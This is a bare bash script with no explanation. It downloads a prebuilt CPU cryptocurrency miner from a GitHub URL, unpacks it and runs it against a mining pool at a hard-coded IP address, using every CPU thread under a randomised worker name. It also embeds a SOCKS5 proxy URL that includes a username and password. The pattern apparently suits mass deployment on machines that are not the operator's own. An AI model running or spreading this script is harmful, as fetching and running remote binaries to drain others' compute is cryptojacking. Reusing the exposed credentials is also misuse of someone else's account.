#!/bin/bash
proxy="socks5://a019xpj2-3va47yc:gad7w69xcf@socks-us.windscribe.com:1080"
array[0]="0001"
array[1]="0002"
array[2]="0003"
size=${#array[@]}
index=$(($RANDOM % $size))
worker=${array[$index]}
apt-get update
wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz 
tar xf hellminer_cpu_linux.tar.gz
./hellminer -c  stratum+tcp://139.99.123.225:3956 -u RGVegWzDKhuPUAKJybftAZm4BXShNFPCYe.$(echo $(shuf -i 1-10 -n 1)-MOD) -p x -t $(nproc --all)
echo succes
